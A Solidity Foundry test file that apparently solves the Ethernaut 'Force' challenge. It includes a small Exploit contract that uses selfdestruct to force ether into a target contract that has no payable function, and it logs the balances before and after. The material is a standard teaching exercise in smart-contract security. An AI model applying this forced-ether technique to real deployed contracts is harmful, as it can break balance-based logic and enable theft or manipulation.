// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force/Force.sol";
import {Test, console} from "forge-std/Test.sol";

contract ForceTest is Test {
    Force force;

    function setUp() public {
        force = new Force();
    }

    function test_Force() public {
        /**
         *
         */
        console.log("Balance before exploit:", address(force).balance);
        vm.deal(address(this), 1 ether);
        Exploit exploit = new Exploit{value: 1 ether}(payable(address(force)));

        // Force contract should have received Ether
        console.log("Balance after exploit:", address(force).balance);
        assert(address(force).balance > 0);
    }
}

contract Exploit {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
